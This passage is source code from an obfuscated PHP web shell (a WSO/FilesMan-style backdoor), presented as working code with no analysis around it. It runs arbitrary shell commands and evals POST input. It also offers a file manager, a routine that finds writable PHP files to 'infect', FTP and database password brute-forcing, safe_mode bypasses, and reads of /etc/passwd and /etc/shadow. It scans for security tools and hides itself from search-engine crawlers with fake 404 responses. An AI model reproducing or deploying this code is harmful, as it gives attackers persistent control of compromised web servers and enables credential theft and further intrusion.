                    echo '<script>p3_="";</script><form onsubmit="g(null,null,\'' . urlencode($_POST['p1']) . '\',null,this.touch.value);return false;"><input type=text name=touch value="' . date("Y-m-d H:i:s", @filemtime($_POST['p1'])) . '"><input type=submit value="submit"></form>';
                    goto x22eB;
                    BLb_K:
                case 'frame':
                    goto f6Zu7;
                    LMIpc:
                    if ($frameSrc[strlen($frameSrc) - 1] != '/') {
                        $frameSrc = $frameSrc . '/';
                    }
                    goto Yjt8y;
                    kH3DB:
                    if ($frameSrc[0] != '/') {
                        $frameSrc = '/' . $frameSrc;
                    }
                    goto LMIpc;
                    e90L2:
                    echo '<iframe width="100%" height="900px" scrolling="no" src=' . $frameSrc . ' onload="onload=height=contentDocument.body.scrollHeight"></iframe>';
                    goto cuwMl;
                    f6Zu7:
                    $frameSrc = substr(htmlspecialchars($GLOBALS['cwd']), strlen(htmlspecialchars($_SERVER['DOCUMENT_ROOT'])));
                    goto kH3DB;
                    Yjt8y:
                    $frameSrc = $frameSrc . htmlspecialchars($_POST['p1']);
                    goto e90L2;
                    cuwMl:
                    break;
                    goto BDzC7;
                    BDzC7:
            }
            goto QYZ1D;
            KZGE4:
            YCSzmFooter();
            goto xB4GP;
            GMdln:
            foreach ($m as $v) {
                echo '<a href=# onclick="g(null,null,\'' . urlencode($_POST['p1']) . '\',\'' . strtolower($v) . '\')">' . (strtolower($v) == @$_POST['p2'] ? '<b>[ ' . $v . ' ]</b>' : $v) . '</a> ';
            }
            goto H0mUi;
            aatIE:
            echo '<span>Name:</span> ' . htmlspecialchars(@basename($_POST['p1'])) . ' <span>Size:</span> ' . (is_file($_POST['p1']) ? viewSize(filesize($_POST['p1'])) : '-') . ' <span>Permission:</span> ' . viewPermsColor($_POST['p1']) . ' <span>Owner/Group:</span> ' . $uid['name'] . '/' . $gid['name'] . '<br>';
            goto M6QF_;
            M6QF_:
            echo '<span>Create time:</span> ' . date('Y-m-d H:i:s', filectime($_POST['p1'])) . ' <span>Access time:</span> ' . date('Y-m-d H:i:s', fileatime($_POST['p1'])) . ' <span>Modify time:</span> ' . date('Y-m-d H:i:s', filemtime($_POST['p1'])) . '<br><br>';
            goto htFA3;
            htFA3:
            if (empty($_POST['p2'])) {
                $_POST['p2'] = 'view';
            }
            goto HmysT;
            X3lB0:
            if (@$_POST['p2'] == 'download') {
                if (@is_file($_POST['p1']) && @is_readable($_POST['p1'])) {
                    goto dsvXV;
                    dsvXV:
                    ob_start("ob_gzhandler", 4096);
                    goto sKvO6;
                    AbP0M:
                    if (function_exists("mime_content_type")) {
                        $type = @mime_content_type($_POST['p1']);
                        header("Content-Type: " . $type);
                    } else {
                        header("Content-Type: application/octet-stream");
                    }
                    goto MZrBf;
                    MZrBf:
                    $fp = @fopen($_POST['p1'], "r");
                    goto zl4aY;
                    zl4aY:
                    if ($fp) {
                        while (!@feof($fp)) {
                            echo @fread($fp, 1024);
                        }
                        fclose($fp);
                    }
                    goto K0MuK;
                    sKvO6:
                    header("Content-Disposition: attachment; filename=" . basename($_POST['p1']));
                    goto AbP0M;
                    K0MuK:
                }
                exit;
            }
            goto IRNTO;
            HmysT:
            if (is_file($_POST['p1'])) {
                $m = array('View', 'Highlight', 'Download', 'Hexdump', 'Edit', 'Chmod', 'Rename', 'Touch', 'Frame');
            } else {
                $m = array('Chmod', 'Rename', 'Touch');
            }
            goto GMdln;
            H0mUi:
            echo '<br><br>';
            goto pCRbK;
            HZT47:
            YCSzmHeader();
            goto ncB7C;
            QYZ1D:
            echo '</div>';
            goto KZGE4;
            IRNTO:
            if (@$_POST['p2'] == 'mkfile') {
                if (!file_exists($_POST['p1'])) {
                    $fp = @fopen($_POST['p1'], 'w');
                    if ($fp) {
                        $_POST['p2'] = "edit";
                        fclose($fp);
                    }
                }
            }
            goto HZT47;
            xB4GP:
        }
        goto gW18U;
        TFRSf:
        $▙ = md5($_SERVER['HTTP_USER_AGENT']);
        goto QJ2tV;
        SJoa0:
        @ini_set('max_execution_time', 0);
        goto N4lhb;
        pFSC_:
        function ex($in)
        {
            goto S_wZW;
            ZpAvY:
            return $▖ == '' ? "↳ Query did not return anything\n" : $▖;
            goto dOUur;
            f4UO7:
            if (function_exists('exec')) {
                @exec($in, $▖);
                $▖ = @join("\n", $▖);
            } elseif (function_exists('passthru')) {
                goto h9YpL;
                uCqom:
                $▖ = ob_get_clean();
                goto B276A;
                h9YpL:
                ob_start();
                goto MLneo;
                MLneo:
                @passthru($in);
                goto uCqom;
                B276A:
            } elseif (function_exists('system')) {
                goto P6Gdn;
                ugPCL:
                $▖ = ob_get_clean();
                goto AEAml;
                JlXvT:
                @system($in);
                goto ugPCL;
                P6Gdn:
                ob_start();
                goto JlXvT;
                AEAml:
            } elseif (function_exists('shell_exec')) {
                $▖ = shell_exec($in);
            } elseif (is_resource($f = @popen($in, "r"))) {
                goto V9vAZ;
                dc4cK:
                while (!@feof($f)) {
                    $▖ .= fread($f, 1024);
                }
                goto UWIUa;
                UWIUa:
                pclose($f);
                goto n_blJ;
                V9vAZ:
                $▖ = "";
                goto dc4cK;
                n_blJ:
            } else {
                return "↳ Unable to execute command\n";
            }
            goto ZpAvY;
            S_wZW:
            $▖ = '';
            goto f4UO7;
            dOUur:
        }
        goto xtaAz;
        mnoGQ:
        function actionInfect()
        {
            goto iw0j2;
            nNWH6:
            echo '<h1>Infect</h1><div class=content>';
            goto pjsQz;
            pjsQz:
            if ($_POST['p1'] == 'infect') {
                goto l9t4x;
                M1hGV:
                foreach (ListFiles($target) as $key => $file) {
                    $nFile = substr($file, -4, 4);
                    if ($nFile == ".php") {
                        if ($file != $_SERVER['DOCUMENT_ROOT'] . $_SERVER['PHP_SELF'] && is_writeable($file)) {
                            echo "{$file}<br>";
                            $i++;
                        }
                    }
                }
                goto MmZy5;
                MmZy5:
                echo "<font color=red size=14>{$i}</font>";
                goto su_AR;
                sqMl6:
                function ListFiles($dir)
                {
                    if ($dh = opendir($dir)) {
                        goto ygolp;
                        ARYJk:
                        return $files;
                        goto KgCIK;
                        A7u1w:
                        $inner_files = array();
                        goto IFSjJ;
                        ygolp:
                        $files = array();
                        goto A7u1w;
                        TsCi2:
                        closedir($dh);
                        goto ARYJk;
                        IFSjJ:
                        while ($file = readdir($dh)) {
                            if ($file != "." && $file != "..") {
                                if (is_dir($dir . "/" . $file)) {
                                    $inner_files = ListFiles($dir . "/" . $file);
                                    if (is_array($inner_files)) {
                                        $files = array_merge($files, $inner_files);
                                    }
                                } else {
                                    array_push($files, $dir . "/" . $file);
                                }
                            }
                        }
                        goto TsCi2;
                        KgCIK:
                    }
                }
                goto M1hGV;
                l9t4x:
                $target = $_SERVER['DOCUMENT_ROOT'];
                goto sqMl6;
                su_AR:
            } else {
                echo "<form method=post><input type=submit value=Infect name=infet></form>";
                echo 'Really want to infect the server?&nbsp;<a href=# onclick="g(null,null,\'infect\')">Yes</a></div>';
            }
            goto Fzv8b;
            Fzv8b:
            YCSzmFooter();
            goto jDcL1;
            iw0j2:
            YCSzmHeader();
            goto nNWH6;
            jDcL1:
        }
        goto zh3xa;
        N5Bc5:
        function YCSzmLogin()
        {
            if (!empty($_SERVER['HTTP_USER_AGENT'])) {
                $userAgents = array("Google", "Slurp", "MSNBot", "ia_archiver", "Yandex", "Rambler");
                if (preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
                    header('HTTP/1.0 404 Not Found');
                    exit;
                }
            }
            die("<pre align=center><form method=post>Password<br><input type=password name=pass style='background-color:whitesmoke;border:1px solid #FFF;outline:none;' required><input type=submit name='watching' value='submit' style='border:none;background-color:#56AD15;color:#fff;cursor:pointer;'></form></pre>");
        }
        goto TXCE1;
        qs_s1:
        if (strtolower(substr(PHP_OS, 0, 3)) == "win") {
            $os = 'win';
        } else {
            $os = 'nix';
        }
        goto I7n5V;
        Mqhbb:
        function actionRC()
        {
            if (!@$_POST['p1']) {
                $a = array("uname" => php_uname(), "php_version" => phpversion(), "VERSION" => VERSION, "safemode" => @ini_get('safe_mode'));
                echo serialize($a);
            } else {
                eval($_POST['p1']);
            }
        }
        goto YU1zn;
        jNrxQ:
        function which($p)
        {
            goto hRIYZ;
            NqmIK:
            return false;
            goto nzQOb;
            hRIYZ:
            $path = ex('which ' . $p);
            goto NwcYE;
            NwcYE:
            if (!empty($path)) {
                return $path;
            }
            goto NqmIK;
            nzQOb:
        }
        goto Mqhbb;
        a9ZAj:
        $disable_functions = @ini_get('disable_functions');
        goto eSSa3;
        BspWQ:
        if (isset($_POST['c'])) {
            @chdir($_POST['c']);
        }
        goto yIcxG;
        aCtDM:
        if (!function_exists("posix_getgrgid") && strpos($GLOBALS['disable_functions'], 'posix_getgrgid') === false) {
            function posix_getgrgid($p)
            {
                return false;
            }
        }
        goto pFSC_;
        Uc_nG:
        if (empty($_POST['charset'])) {
            $_POST['charset'] = $▜;
        }
        goto MGTBJ;
        zh3xa:
        function actionBruteforce()
        {
            goto PNkOt;
            LD3mT:
            if (isset($_POST['proto'])) {
                goto M3SVk;
                M3SVk:
                echo '<h1>Results</h1><div class=content><span>Type:</span> ' . htmlspecialchars($_POST['proto']) . ' <span>Server:</span> ' . htmlspecialchars($_POST['server']) . '<br>';
                goto VVZnv;
                VVZnv:
                if ($_POST['proto'] == 'ftp') {
                    function bruteForce($ip, $port, $login, $pass)
                    {
                        goto V3OYG;
                        V3OYG:
                        $fp = @ftp_connect($ip, $port ? $port : 21);
                        goto H24iD;
                        et_Iy:
                        return $res;
                        goto ay9qd;
                        YYHy3:
                        $res = @ftp_login($fp, $login, $pass);
                        goto I6TbE;
                        H24iD:
                        if (!$fp) {
                            return false;
                        }
                        goto YYHy3;
                        I6TbE:
                        @ftp_close($fp);
                        goto et_Iy;
                        ay9qd:
                    }
                } elseif ($_POST['proto'] == 'mysql') {
                    function bruteForce($ip, $port, $login, $pass)
                    {
                        goto gcOix;
                        OxNn9:
                        return $res;
                        goto ZpZsN;
                        gcOix:
                        $res = @mysql_connect($ip . ':' . ($port ? $port : 3306), $login, $pass);
                        goto GFzyV;
                        GFzyV:
                        @mysql_close($res);
                        goto OxNn9;
                        ZpZsN:
                    }
                } elseif ($_POST['proto'] == 'pgsql') {
                    function bruteForce($ip, $port, $login, $pass)
                    {
                        goto mwK70;
                        c1pnp:
                        @pg_close($res);
                        goto q77SM;
                        ESU0q:
                        $res = @pg_connect($str);
                        goto c1pnp;
                        mwK70:
                        $str = "host='" . $ip . "' port='" . $port . "' user='" . $login . "' password='" . $pass . "' dbname=postgres";
                        goto ESU0q;
                        q77SM:
                        return $res;
                        goto DKsDe;
                        DKsDe:
                    }
                }
                goto brq2h;
                sajxx:
                $server = explode(":", $_POST['server']);
                goto CT6w4;
                CT6w4:
                if ($_POST['type'] == 1) {
                    $temp = @file('/etc/passwd');
                    if (is_array($temp)) {
                        foreach ($temp as $line) {
                            goto lq1Nn;
                            a1J4h:
                            ++$attempts;
                            goto wvXkq;
                            KpH_J:
                            if (@$_POST['reverse']) {
                                goto dTQ1W;
                                oQTqJ:
                                ++$attempts;
                                goto cjjk9;
                                dTQ1W:
                                $tmp = "";
                                goto yDyoW;
                                cjjk9:
                                if (bruteForce(@$server[0], @$server[1], $line[0], $tmp)) {
                                    $success++;
                                    echo '<b>' . htmlspecialchars($line[0]) . '</b>:' . htmlspecialchars($tmp);
                                }
                                goto wUfs_;
                                yDyoW:
                                for ($i = strlen($line[0]) - 1; $i >= 0; --$i) {
                                    $tmp .= $line[0][$i];
                                }
                                goto oQTqJ;
                                wUfs_:
                            }
                            goto ZelQT;
                            wvXkq:
                            if (bruteForce(@$server[0], @$server[1], $line[0], $line[0])) {
                                $success++;
                                echo '<b>' . htmlspecialchars($line[0]) . '</b>:' . htmlspecialchars($line[0]) . '<br>';
                            }
                            goto KpH_J;
                            lq1Nn:
                            $line = explode(":", $line);
                            goto a1J4h;
                            ZelQT:
                        }
                    }
                } elseif ($_POST['type'] == 2) {
                    $temp = @file($_POST['dict']);
                    if (is_array($temp)) {
                        foreach ($temp as $line) {
                            goto rkBLT;
                            Ho7ri:
                            if (bruteForce($server[0], @$server[1], $_POST['login'], $line)) {
                                $success++;
                                echo '<b>' . htmlspecialchars($_POST['login']) . '</b>:' . htmlspecialchars($line) . '<br>';
                            }
                            goto z6Kox;
                            SolPX:
                            ++$attempts;
                            goto Ho7ri;
                            rkBLT:
                            $line = trim($line);
                            goto SolPX;
                            z6Kox:
                        }
                    }
                }
                goto Wh7GM;
                brq2h:
                $success = 0;
                goto lOkvB;
                Wh7GM:
                echo "<span>Attempts:</span> {$attempts} <span>Success:</span> {$success}</div><br>";
                goto LCCfD;
                lOkvB:
                $attempts = 0;
                goto sajxx;
                LCCfD:
            }
            goto HJYzT;
            PNkOt:
            YCSzmHeader();
            goto LD3mT;
            HJYzT:
            echo '<h1>FTP bruteforce</h1><div class=content><table><form method=post><tr><td><span>Type</span></td>' . '<td><label><select name=proto><option value=ftp>FTP</option><option value=mysql>MySql</option><option value=pgsql>PostgreSql</option></select></label></td></tr><tr><td>' . '<input type=hidden name=c value="' . htmlspecialchars($GLOBALS['cwd']) . '">' . '<input type=hidden name=a value="' . htmlspecialchars($_POST['a']) . '">' . '<input type=hidden name=charset value="' . htmlspecialchars($_POST['charset']) . '">' . '<input type=hidden name=ne  value="">' . '<span>Server:port</span></td>' . '<td><input type=text name=server value="127.0.0.1"></td></tr>' . '<tr><td><span>Brute type</span></td>' . '<td><input type=radio name=type value="1" checked> /etc/passwd</td></tr>' . '<tr><td></td><td style="padding-left:15px"><input type=checkbox name=reverse value=1 checked> reverse (login -> nigol)</td></tr>' . '<tr><td></td><td><input type=radio name=type value="2"> Dictionary</td></tr>' . '<tr><td></td><td><table style="padding-left:15px"><tr><td><span>Login</span></td>' . '<td><input type=text name=login value="root"></td></tr>' . '<tr><td><span>Dictionary</span></td>' . '<td><input type=text name=dict value="' . htmlspecialchars($GLOBALS['cwd']) . 'passwd.dic"></td></tr></table>' . '</td></tr><tr><td></td><td><input type=submit value="submit"></td></tr></form></table>';
            goto H_pSZ;
            H_pSZ:
            echo '</div>';
            goto xGPui;
            xGPui:
            YCSzmFooter();
            goto lynt5;
            lynt5:
        }
        goto Y87Rk;
        W8IuU:
        if (!function_exists("posix_getpwuid") && strpos($GLOBALS['disable_functions'], 'posix_getpwuid') === false) {
            function posix_getpwuid($p)
            {
                return false;
            }
        }
        goto aCtDM;
        LeeSt:
        $▚ = 'FilesMan';
        goto TFRSf;
        Etpe0:
        function viewPermsColor($f)
        {
            if (!@is_readable($f)) {
                return '<font color=#FF0000><b>' . perms(@fileperms($f)) . '</b></font>';
            } elseif (!@is_writable($f)) {
                return '<font color=white><b>' . perms(@fileperms($f)) . '</b></font>';
            } else {
                return '<font color=#FFDB5F><b>' . perms(@fileperms($f)) . '</b></font>';
            }
        }
        goto olUV9;
        eSSa3:
        $home_cwd = @getcwd();
        goto BspWQ;
        YU1zn:
        function actionSecInfo()
        {
            goto IbAJg;
            N1LN4:
            showSecParam('cURL support', function_exists('curl_version') ? 'enabled' : 'no');
            goto LC4qb;
            pJuac:
            showSecParam('Safe mode exec dir', @ini_get('safe_mode_exec_dir'));
            goto YCAiK;
            IPnbg:
            echo '<h1>Server security information</h1><div class=content>';
            goto OE_sa;
            zDar5:
            if (function_exists('apache_get_modules')) {
                showSecParam('Loaded Apache modules', implode(', ', apache_get_modules()));
            }
            goto qGtqh;
            qm78p:
            if (function_exists('mysql_get_client_info')) {
                $temp[] = "MySql (" . mysql_get_client_info() . ")";
            }
            goto TUeZX;
            qGtqh:
            showSecParam('Disabled PHP Functions', $GLOBALS['disable_functions'] ? $GLOBALS['disable_functions'] : 'none');
            goto S6kgA;
            hMg4h:
            echo '<br>';
            goto uNuUA;
            LC4qb:
            $temp = array();
            goto qm78p;
            TUeZX:
            if (function_exists('mssql_connect')) {
                $temp[] = "MSSQL";
            }
            goto u0kL9;
            cpzcD:
            showSecParam('Supported databases', implode(', ', $temp));
            goto hMg4h;
            YCAiK:
            showSecParam('Safe mode include dir', @ini_get('safe_mode_include_dir'));
            goto N1LN4;
            tO28U:
            echo '</div>';
            goto Kg9Qq;
            uNuUA:
            if ($GLOBALS['os'] == 'nix') {
                goto qIjT2;
                qIjT2:
                showSecParam('Readable /etc/passwd', @is_readable('/etc/passwd') ? "yes <a href='#' onclick='g(\"FilesTools\", \"/etc/\", \"passwd\")'>[view]</a>" : 'no');
                goto pITxu;
                pITxu:
                showSecParam('Readable /etc/shadow', @is_readable('/etc/shadow') ? "yes <a href='#' onclick='g(\"FilesTools\", \"/etc/\", \"shadow\")'>[view]</a>" : 'no');
                goto H0nS8;
                MzVMU:
                showSecParam('Distr name', @file_get_contents('/etc/issue.net'));
                goto CK75S;
                CK75S:
                if (!$GLOBALS['safe_mode']) {
                    goto OMIns;
                    KUNoF:
                    foreach ($userful as $▟) {
                        if (which($▟)) {
                            $temp[] = $▟;
                        }
                    }
                    goto LgiEV;
                    G6K84:
                    showSecParam('Danger', implode(', ', $temp));
                    goto Jp7rP;
                    k5Vai:
                    echo '<br>';
                    goto Afdx8;
                    kMd5r:
                    showSecParam('Hosts', @file_get_contents('/etc/hosts'));
                    goto bz3Gs;
                    dzQCS:
                    $temp = array();
                    goto zvBIe;
                    u1fvC:
                    echo '<br/>';
                    goto Xf_Lr;
                    bz3Gs:
                    showSecParam('Mount options', @file_get_contents('/etc/fstab'));
                    goto OdEgy;
                    Xf_Lr:
                    showSecParam('HDD space', ex('df -h'));
                    goto kMd5r;
                    ZhnFu:
                    $danger = array('kav', 'nod32', 'bdcored', 'uvscan', 'sav', 'drwebd', 'clamd', 'rkhunter', 'chkrootkit', 'iptables', 'ipfw', 'tripwire', 'shieldcc', 'portsentry', 'snort', 'ossec', 'lidsadm', 'tcplodg', 'sxid', 'logcheck', 'logwatch', 'sysmask', 'zmbscap', 'sawmill', 'wormscan', 'ninja');
                    goto UHsYm;
                    VkyGh:
                    foreach ($downloaders as $▟) {
                        if (which($▟)) {
                            $temp[] = $▟;
                        }
                    }
                    goto xO4Uv;
                    zvBIe:
                    foreach ($danger as $▟) {
                        if (which($▟)) {
                            $temp[] = $▟;
                        }
                    }
                    goto G6K84;
                    UHsYm:
                    $downloaders = array('wget', 'fetch', 'lynx', 'links', 'curl', 'get', 'lwp-mirror');
                    goto k5Vai;
                    OMIns:
                    $userful = array('gcc', 'lcc', 'cc', 'ld', 'make', 'php', 'perl', 'python', 'ruby', 'tar', 'gzip', 'bzip', 'bzip2', 'nc', 'locate', 'suidperl');
                    goto ZhnFu;
                    Jp7rP:
                    $temp = array();
                    goto VkyGh;
                    LgiEV:
                    showSecParam('Userful', implode(', ', $temp));
                    goto dzQCS;
                    xO4Uv:
                    showSecParam('Downloaders', implode(', ', $temp));
                    goto u1fvC;
                    Afdx8:
                    $temp = array();
                    goto KUNoF;
                    OdEgy:
                }
                goto JrLeJ;
                H0nS8:
                showSecParam('OS version', @file_get_contents('/proc/version'));
                goto MzVMU;
                JrLeJ:
            } else {
                goto HGvPT;
                HGvPT:
                showSecParam('OS Version', ex('ver'));
                goto TQL1R;
                TQL1R:
                showSecParam('Account Settings', iconv('CP866', 'UTF-8', ex('net accounts')));
                goto Bb3O0;
                Bb3O0:
                showSecParam('User Accounts', iconv('CP866', 'UTF-8', ex('net user')));
                goto bbUL_;
                bbUL_:
            }
            goto tO28U;
            Kg9Qq:
            YCSzmFooter();
            goto Bis98;
            OE_sa:
            function showSecParam($n, $v)
            {
                $v = trim($v);
                if ($v) {
                    echo '<span>' . $n . ': </span>';
                    if (strpos($v, "\n") === false) {
                        echo $v . '<br>';
                    } else {
                        echo '<pre class=ml1>' . $v . '</pre>';
                    }
                }
            }
            goto jue1E;
            jue1E:
            showSecParam('Server software', @getenv('SERVER_SOFTWARE'));
            goto zDar5;
            S6kgA:
            showSecParam('Open base dir', @ini_get('open_basedir'));
            goto pJuac;
            IbAJg:
            YCSzmHeader();
            goto IPnbg;
            u0kL9:
            if (function_exists('pg_connect')) {
                $temp[] = "PostgreSQL";
            }
            goto zVB_3;
            zVB_3:
            if (function_exists('oci_connect')) {
                $temp[] = "Oracle";
            }
            goto cpzcD;
            Bis98:
        }
        goto NN1RP;
        CwDBi:
        if (empty($_POST['a'])) {
            if (isset($▚) && function_exists('action' . $▚)) {
                $_POST['a'] = $▚;
            } else {
                $_POST['a'] = 'FilesMan';
            }
        }
        goto hfJGa;
        jskum:
        function actionSafeMode()
        {
            goto AASWt;
            r6Y1d:
            YCSzmFooter();
            goto t8KWQ;
            B_mlC:
            if ($temp) {
                echo '<pre class="ml1" style="margin-top:5px" id="Output">' . $temp . '</pre>';
            }
            goto NZc6c;
            IJOUI:
            switch ($_POST['p1']) {
                case 1:
                    goto KHyib;
                    dDGoE:
                    break;
                    goto bsssp;
                    I0rYR:
                    if (@copy("compress.zlib://" . $_POST['p2'], $temp)) {
                        echo @file_get_contents($temp);
                        unlink($temp);
                    } else {
                        echo 'Sorry... Can\'t open file';
                    }
                    goto dDGoE;
                    KHyib:
                    $temp = @tempnam($test, 'cx');
                    goto I0rYR;
                    bsssp:
                case 2:
                    goto YDj6S;
                    ONLBq:
                    if (is_array($files)) {
                        foreach ($files as $filename) {
                            echo $filename . "\n";
                        }
                    }
                    goto A1mo0;
                    A1mo0:
                    break;
                    goto QqJiQ;
                    YDj6S:
                    $files = glob($_POST['p2'] . '*');
                    goto ONLBq;
                    QqJiQ:
                case 3:
                    goto igBMO;
                    uGW4a:
                    curl_exec($ch);
                    goto x2EMC;
                    x2EMC:
                    break;
                    goto RIJM1;
                    igBMO:
                    $ch = curl_init("file://" . $_POST['p2'] . "\0" . SELF_PATH);
                    goto uGW4a;
                    RIJM1:
                case 4:
                    goto iRGqo;
                    kJ_HR:
                    break;
                    goto D1QSC;
                    iRGqo:
                    ini_restore("safe_mode");
                    goto rru9m;
                    rru9m:
                    ini_restore("open_basedir");
                    goto yroKL;
                    yroKL:
                    include $_POST['p2'];
                    goto kJ_HR;
                    D1QSC:
                case 5:
                    for (; $_POST['p2'] <= $_POST['p3']; $_POST['p2']++) {
                        $uid = @posix_getpwuid($_POST['p2']);
                        if ($uid) {
                            echo join(':', $uid) . "\n";
                        }
                    }
                    break;
                case 6:
                    goto dkBR1;
                    psweX:
                    imap_close($stream);
                    goto ben2M;
                    YrIBs:
                    $stream = imap_open($_POST['p2'], "", "");
                    goto ZQZOZ;
                    dkBR1:
                    if (!function_exists('imap_open')) {
                        break;
                    }
                    goto YrIBs;
                    SNqPG:
                    echo imap_body($stream, 1);
                    goto psweX;
                    ZQZOZ:
                    if ($stream == FALSE) {
                        break;
                    }
                    goto SNqPG;
                    ben2M:
                    break;
                    goto s0hGy;
                    s0hGy:
            }
            goto t0PJA;
            z8Ygi:
            ob_start();
            goto IJOUI;
            NZc6c:
            echo '</div>';
            goto r6Y1d;
            t0PJA:
            $temp = ob_get_clean();
            goto YT17Y;
            CwFQ0:
            echo '<span>Copy (read file)</span><form onsubmit=\'g(null,null,"1",this.param.value);return false;\'><input class="toolsInp" type=text name=param><input type=submit value="submit"></form><br><span>Glob (list dir)</span><form onsubmit=\'g(null,null,"2",this.param.value);return false;\'><input class="toolsInp" type=text name=param><input type=submit value="submit"></form><br><span>Curl (read file)</span><form onsubmit=\'g(null,null,"3",this.param.value);return false;\'><input class="toolsInp" type=text name=param><input type=submit value="submit"></form><br><span>Ini_restore (read file)</span><form onsubmit=\'g(null,null,"4",this.param.value);return false;\'><input class="toolsInp" type=text name=param><input type=submit value="submit"></form><br><span>Posix_getpwuid ("Read" /etc/passwd)</span><table><form onsubmit=\'g(null,null,"5",this.param1.value,this.param2.value);return false;\'><tr><td>From</td><td><input type=text name=param1 value=0></td></tr><tr><td>To</td><td><input type=text name=param2 value=1000></td></tr></table><input type=submit value="submit"></form><br><br><span>Imap_open (read file)</span><form onsubmit=\'g(null,null,"6",this.param.value);return false;\'><input type=text name=param><input type=submit value="submit"></form>';
            goto B_mlC;
            AASWt:
            $temp = '';
            goto z8Ygi;
            YT17Y:
            YCSzmHeader();
            goto b0MrD;
            b0MrD:
            echo '<h1>Safe mode bypass</h1><div class=content>';
            goto CwFQ0;
            t8KWQ:
        }
        goto vi0BU;
        yIcxG:
        $cwd = @getcwd();
        goto zjsHI;
        TXCE1:
        if (!empty($▛)) {
            if (isset($_POST['pass']) && $_POST['pass'] == $▛) {
                prototype(md5($_SERVER['HTTP_HOST']), $▛);
            }
            if (!isset($_COOKIE[md5($_SERVER['HTTP_HOST'])]) || $_COOKIE[md5($_SERVER['HTTP_HOST'])] != $▛) {
                YCSzmLogin();
            }
        }
        goto diGuy;
        diGuy:
        if (!isset($_COOKIE[md5($_SERVER['HTTP_HOST']) . 'ajax'])) {
            $_COOKIE[md5($_SERVER['HTTP_HOST']) . 'ajax'] = (bool) $▘;
        }
        goto qs_s1;
        yHI4a:
        function actionSelfRemove()
        {
            goto XfTDq;
            XfTDq:
            if ($_POST['p1'] == 'yes') {
                if (@unlink(preg_replace('!\\(\\d+\\)\\s.*!', '', __FILE__))) {
                    die('Shell has been removed');
                } else {
                    echo 'unlink error!';
                }
            }
            goto b6JOg;
            Yw9c2:
            echo '<h1>Suicide</h1><div class=content>Really want to remove the shell?<br><a href=# onclick="g(null,null,\'yes\')">Yes</a></div>';
            goto X7LcO;
            X7LcO:
            YCSzmFooter();
            goto BaQ1P;
            b6JOg:
            if ($_POST['p1'] != 'yes') {
                YCSzmHeader();
            }
            goto Yw9c2;
            BaQ1P:
        }
        goto mnoGQ;
        a_FGf:
    } else {
        $ziwziw = $_POST['lynx'];
        if ($ziwziw == 'adding') {
            echo php_uname();
            echo 'sarafinoubombom';
        } else {
            if ($ziwziw == 'ip') {
                $ip = $_SERVER['SERVER_ADDR'];
                if (filter_var($ip, FILTER_VALIDATE_IP)) {
                    echo $ip;
                    echo 'sarafinoubombom';
                } else {
                    goto YvAjK;
                    gF1Bb:
                    $ip = gethostbyname($host);
                    goto vRzDI;
                    vRzDI:
                    echo $ip;
                    goto R4T8X;
                    R4T8X:
                    echo 'sarafinoubombom';
                    goto evqts;
                    YvAjK:
                    $host = gethostname();
                    goto gF1Bb;
                    evqts:
                }
            }
        }
    }
